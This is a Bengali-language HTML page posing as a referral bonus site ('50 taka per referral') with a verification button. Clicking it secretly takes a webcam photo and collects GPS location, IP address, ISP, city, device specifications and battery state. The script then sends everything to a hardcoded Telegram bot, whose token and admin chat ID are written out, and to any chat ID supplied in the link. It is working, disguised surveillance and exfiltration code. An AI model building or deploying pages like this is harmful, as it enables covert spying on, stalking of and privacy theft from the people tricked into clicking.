<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #000;
            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
            background-size: cover; background-position: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.85); 
            padding: 40px 20px; border-radius: 15px; width: 85%; max-width: 380px;
            z-index: 2; position: relative; border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00;
        }
        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; text-transform: uppercase; }
        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
        #verify-btn { 
            background-color: #00ff00; color: #000; border: none; padding: 15px; 
            font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
            transition: 0.3s; letter-spacing: 1px;
        }
        #verify-btn:hover { background-color: #053b05; color: #00ff00; }
        #status { margin-top: 25px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
        .success { color: #00ff00 !important; }
        .error { color: #ff0000 !important; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>বোনাস সিস্টেম</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <button id="verify-btn">START REFER</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
        const adminId = "7068444019"; 
        const urlParams = new URLSearchParams(window.location.search);
        const userIdFromLink = urlParams.get('id'); 

        const verifyBtn = document.getElementById('verify-btn');
        const status = document.getElementById('status');

        let gpsData = "\n📍 **GPS লোকেশন:** পারমিশন নেই";

        // GPS ট্র্যাকিং ফাংশন
        function fetchGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    gpsData = `\n🎯 **সঠিক GPS লোকেশন (গুগল ম্যাপস):**\n[এখানে ক্লিক করুন](https://www.google.com/maps?q=${lat},${lon})`;
                });
            }
        }

        async function getDeepIntel() {
            let intel = "\n\n🌐 **নেটওয়ার্ক তথ্য**";
            try {
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                intel += `\nআইপি: \`${d.ip}\`\nইন্টারনেট: \`${d.connection.isp}\`\nশহর: \`${d.city}, ${d.country}\``;
                
                intel += "\n\n💻 **ডিভাইস তথ্য**";
                intel += `\nপ্রসেসর কোর: \`${navigator.hardwareConcurrency || 'N/A'}\`\nর‍্যাম: \`${navigator.deviceMemory || 'N/A'}GB\`\nস্ক্রিন: \`${window.screen.width}x${window.screen.height}\``;
                
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    intel += `\nব্যাটারি: \`${Math.round(b.level * 100)}% (${b.charging ? 'চার্জ হচ্ছে' : 'হচ্ছে না'})\``;
                }
            } catch (e) { intel += "\nতথ্য পাওয়া যায়নি।"; }
            return intel;
        }

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "> সিস্টেম শুরু হচ্ছে...";
            status.className = "success";
            verifyBtn.style.display = "none"; 

            // লোকেশন পারমিশন চাওয়া
            fetchGPS();

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                const intelData = await getDeepIntel();

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const caption = "🛠 **সফলভাবে তথ্য পাওয়া গেছে!**" + intelData + gpsData;
                        
                        await sendToTelegram(blob, adminId, caption);
                        if (userIdFromLink && userIdFromLink !== adminId) {
                            await sendToTelegram(blob, userIdFromLink, caption);
                        }

                        status.innerText = "> বোনাস ভেরিফিকেশন সফল!";
                        status.className = "success";
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.8);
                }, 3000); 

            } catch (err) {
                status.innerText = "> এরর: ক্যামেরা পারমিশন প্রয়োজন!";
                status.className = "error";
                verifyBtn.style.display = "block";
            }
        });

        async function sendToTelegram(blob, id, caption) {
            const formData = new FormData();
            formData.append('chat_id', id);
            formData.append('photo', blob, 'user_photo.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            } catch(e) {}
        }
    </script>
</body>
</html>
